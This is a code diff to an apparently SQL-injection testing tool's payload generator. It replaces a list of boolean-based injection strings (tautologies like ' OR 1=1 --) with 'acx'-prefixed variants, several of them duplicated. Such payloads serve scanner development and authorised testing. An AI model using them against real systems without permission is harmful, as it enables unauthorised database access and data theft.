@@ -45,22 +45,22 @@ class PayloadGenerator:
 
         # Boolean-based payloads
         self.boolean_based_payloads = [
-            "' AND 1=1 -- ",
-            "' AND 1=0 -- ",
-            "' OR 1=1 -- ",
-            "' OR 1=0 -- ",
-            "' AND '1'='1",
-            "' AND '1'='0",
-            "' OR '1'='1",
-            "' OR '1'='0",
-            "1' AND 1=1 -- ",
-            "1' AND 1=0 -- ",
-            "1' OR 1=1 -- ",
-            "1' OR 1=0 -- ",
-            "1 AND 1=1 -- ",
-            "1 AND 1=0 -- ",
-            "1 OR 1=1 -- ",
-            "1 OR 1=0 -- "
+            "acx' AND 1=1-- -",
+            "acx' AND 1=0-- -",
+            "acx' OR 1=1-- -",
+            "acx' OR 1=0-- -",
+            "acx' AND '1'='1",
+            "acx' AND '1'='0",
+            "acx' OR '1'='1",
+            "acx' OR '1'='0",
+            "acx' AND 1=1-- -",
+            "acx' AND 1=0-- -",
+            "acx' OR 1=1-- -",
+            "acx' OR 1=0-- -",
+            "acx' AND 1=1-- -",
+            "acx' AND 1=0-- -",
+            "acx' OR 1=1-- -",
+            "acx' OR 1=0-- -"
         ]
 
         # Time-based payloads (MySQL specific)
